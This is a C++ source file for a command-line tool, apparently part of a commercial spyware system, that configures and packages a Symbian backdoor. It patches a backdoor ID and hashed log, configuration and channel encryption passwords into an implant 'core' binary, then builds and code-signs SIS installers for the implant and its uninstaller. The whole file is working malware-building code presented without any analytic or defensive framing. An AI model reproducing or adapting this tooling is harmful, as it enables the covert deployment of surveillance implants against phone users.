
#include "stdafx.h"
#include <Windows.h>
#include <openssl\md5.h>
#include "polymer.h"
#include "fileutils.h"

bool FindMemMarker(BYTE *pBlockPtr, UINT iLen, BYTE *block, UINT block_len, BYTE *mark_b, UINT mark_len);
extern BOOL SignSis(TCHAR *wsFile, TCHAR *wsCert, TCHAR *wsKey);
extern BOOL CreateSis(UINT flag, TCHAR *wsFile);

int _tmain(int argc, _TCHAR* argv[])
{
	HANDLE hFile;
	BYTE *pBlockPtr	= NULL;
	CHAR szBackdoorId[256];
	CHAR szLogPassword[256];
	CHAR szConfPassword[256];
	CHAR szChanPassword[256];
	WCHAR wsCERFile[MAX_PATH];
	WCHAR wsKEYFile[MAX_PATH];
	WCHAR wsCoreFile[MAX_PATH];
	WCHAR wsUnFile[MAX_PATH];
	WCHAR wsOutFile[MAX_PATH];
	unsigned int iLen = 0;

	if (argc != 9) {
		printf("ERROR: \n");
		printf("  usage:  RCSSymbianPolymer.exe  <bid> <log_pass> <conf_pass> <chanpass> <cer> <key> <core> <uninstaller> <output>\n\n");
		printf("  <bid> is the backdoor_id\n");
		printf("  <log_pass> is the password for the log encryption\n");
		printf("  <conf_pass> is the password for the conf encryption\n");
		printf("  <chanpass> is the password for the channel encryption\n");
		printf("  <cer> is the certificate to sign the sysx\n");
		printf("  <key> is the private key of the certificate\n");
		printf("  <core> is the core to be polymerized\n");
		printf("  <uninstaller> is the core uninstaller\n");
		//printf("  <output> is the output file\n\n");
		return 0;
	}

	sprintf_s(szBackdoorId, sizeof(szBackdoorId), "%S", argv[1]);
	sprintf_s(szLogPassword, sizeof(szLogPassword), "%S", argv[2]);
	sprintf_s(szConfPassword, sizeof(szConfPassword), "%S", argv[3]);
	sprintf_s(szChanPassword, sizeof(szChanPassword), "%S", argv[4]);
	wsprintf(wsCERFile, L"%s", argv[5]);
	wsprintf(wsKEYFile, L"%s", argv[6]);
	wsprintf(wsCoreFile, L"%s", argv[7]);
	wsprintf(wsUnFile, L"%s", argv[8]);
	//wsprintf(wsOutFile, L"%s", argv[9]);

	/************************************************************************/
	/*  SANITY CHECKS                                                       */
	/************************************************************************/
	if (strlen(szBackdoorId) < strlen("RCS_0000000000")) {
		printf("Backdoor_id should be at least %d characters\n", strlen("RCS_0000000000"));
		return ERROR_EMBEDDING;
	}

	if (strlen(szLogPassword) < AES_PASS_LEN) {
		printf("Log Password should be at least %d characters\n", AES_PASS_LEN);
		return ERROR_EMBEDDING;
	}

	if (strlen(szConfPassword) < AES_PASS_LEN) {
		printf("Conf Password should be at least %d characters\n", AES_PASS_LEN);
		return ERROR_EMBEDDING;
	}

	if (strlen(szChanPassword) < CHAN_PASS_LEN) {
		printf("Channel password should be at least %d characters\n", CHAN_PASS_LEN);
		return ERROR_EMBEDDING;
	}

	if ( (hFile = CreateFile(wsCERFile, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, NULL, NULL)) == INVALID_HANDLE_VALUE ) {
		printf("Cannot find CER file [%S]\n", wsCERFile);
		return ERROR_EMBEDDING;
	} else {
		CloseHandle(hFile);
	}

	if ( (hFile = CreateFile(wsKEYFile, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, NULL, NULL)) == INVALID_HANDLE_VALUE ) {
		printf("Cannot find KEY file [%S]\n", wsKEYFile);
		return ERROR_EMBEDDING;
	} else {
		CloseHandle(hFile);
	}

	/************************************************************************/
	/*  READY TO GO                                                         */
	/************************************************************************/

	printf("Ready to go...\n");
	printf("BACKDOOR_ID   [%s]\n", szBackdoorId);
	printf("LOG PASSWORD  [%s]\n", szLogPassword);
	printf("CONF PASSWORD [%s]\n", szConfPassword);
	printf("CHAN PASSWORD [%s]\n", szChanPassword);
	printf("CERFILE       [%S]\n", wsCERFile);
	printf("KEYFILE       [%S]\n", wsKEYFile);
	printf("INPUT CORE    [%S]\n", wsCoreFile);
	printf("UNINSTALLER   [%S]\n", wsUnFile);
	//printf("OUTPUT FILE   [%S]\n\n", wsOutFile);


	/************************************************************************/
	/* UNINSTALLER SIS CREATION                                             */
	/************************************************************************/

	if (CreateSis(SIS_UNINST, wsUnFile))
		printf("Creating uninstaller sis file... ok\n");
	else {
		printf("Cannot create uninstaller sis file [%S]\n", wsUnFile);
		return ERROR_EMBEDDING;
	}

	/************************************************************************/
	/* SIGNING THE UNINSTALLER                                              */
	/************************************************************************/


	if (SignSis(wsUnFile, wsCERFile, wsKEYFile))
		printf("Using the certificate to sign the uninstaller... ok\n");
	else {
		printf("Cannot sign with the certificate file [%S][%S]\n", wsCERFile, wsKEYFile);
		DeleteFile(wsOutFile);
		return ERROR_EMBEDDING;
	}

	/************************************************************************/
	/* BINARY PATCHING                                                      */
	/************************************************************************/

	BYTE bufmd5[MD5_DIGEST_LENGTH];

	pBlockPtr = (BYTE *) LoadFile(wsCoreFile, &iLen);

	// Patching Passwod dei log
	MD5((const UCHAR *)szLogPassword, strlen(szLogPassword) , (PUCHAR) bufmd5);
	if (FindMemMarker(pBlockPtr, iLen, (BYTE *) bufmd5, AES_PASS_LEN, AES_LOG_PASS_MARK, AES_PASS_MARK_LEN))
		printf("Password embedded... ok\n");
	else {
		printf("Cannot embed Log Password [%S]\n", wsOutFile);
		return ERROR_EMBEDDING;
	}

	// Patching Passwod della conf
	MD5((const UCHAR *)szConfPassword, strlen(szConfPassword) , (PUCHAR) bufmd5);
	if (FindMemMarker(pBlockPtr, iLen, (BYTE *) bufmd5, AES_PASS_LEN, AES_CONF_PASS_MARK, AES_PASS_MARK_LEN))
		printf("Password embedded... ok\n");
	else {
		printf("Cannot embed Conf Password [%S]\n", wsOutFile);
		return ERROR_EMBEDDING;
	}

	// Patching Passwod del protocollo
	MD5((const UCHAR *)szChanPassword, strlen(szChanPassword) , (PUCHAR) bufmd5);
	if (FindMemMarker(pBlockPtr, iLen, (BYTE *) bufmd5, CHAN_PASS_LEN, CHAN_PASS_MARK, CHAN_PASS_MARK_LEN))
		printf("Channel Password embedded... ok\n");
	else {
		printf("Cannot embed Channel Password [%S]\n", wsOutFile);
		return ERROR_EMBEDDING;
	}

	// Patching  backdoor ID
	if (FindMemMarker(pBlockPtr, iLen, (BYTE *) szBackdoorId, BACKDOOR_ID_LEN, BACKDOOR_ID_MARK, BACKDOOR_ID_LEN))
		printf("Backdoor_id embedded... ok\n");
	else {
		printf("Cannot embed Backdoor_id [%S]\n", wsOutFile);
		return ERROR_EMBEDDING;
	}

	// Patching nome file configurazione
	if (FindMemMarker(pBlockPtr, iLen, (BYTE *) CONFIG_FILENAME, wcslen(CONFIG_FILENAME) * sizeof(WCHAR), CONFIG_NAME_MARK, CONFIG_NAME_MARK_LEN))
		printf("Config name embedded... ok\n");
	else {
		printf("Cannot embed Config Name [%S]\n", wsOutFile);
		return ERROR_EMBEDDING;
	}

	UnloadFile(pBlockPtr);

	/************************************************************************/
	/* FINAL SIS CREATION                                                   */
	/************************************************************************/

	if (CreateSis(SIS_CORE, wsCoreFile))
		printf("Creating sis file... ok\n");
	else {
		printf("Cannot create sis file [%S]\n", wsCoreFile);
		DeleteFile(wsOutFile);
		return ERROR_EMBEDDING;
	}

	/************************************************************************/
	/* SIGNING                                                              */
	/************************************************************************/


	if (SignSis(wsCoreFile, wsCERFile, wsKEYFile))
		printf("Using the certificate to sign the code... ok\n");
	else {
		printf("Cannot sign with the certificate file [%S][%S]\n", wsCERFile, wsKEYFile);
		DeleteFile(wsOutFile);
		return ERROR_EMBEDDING;
	}


	printf("Output file... ok\n");


	return ERROR_SUCCESS;
}


bool FindMemMarker(BYTE *pBlockPtr, UINT iLen, BYTE *block, UINT block_len, BYTE *mark_b, UINT mark_len)
{
	BYTE *pDataSect	= NULL;
	bool iRet = false;

	pDataSect = pBlockPtr;

	if( pBlockPtr == NULL )
		return false;

	__try {
		while(  pBlockPtr < (pDataSect + iLen) ) {

			if( !memcmp(pBlockPtr,mark_b, mark_len) )
				break;
			else
				pBlockPtr++;
		}
	} __except (GetExceptionCode() == EXCEPTION_ACCESS_VIOLATION ) {
		pBlockPtr = NULL;
	}

	if( pBlockPtr  && (pBlockPtr < ( pDataSect + iLen - 1 ) )   ) {

		memset(pBlockPtr, 0, (int)mark_len);
		memcpy(pBlockPtr, block, (int)block_len);

		iRet = true;

	} else 
		iRet = false;

	return iRet;
}

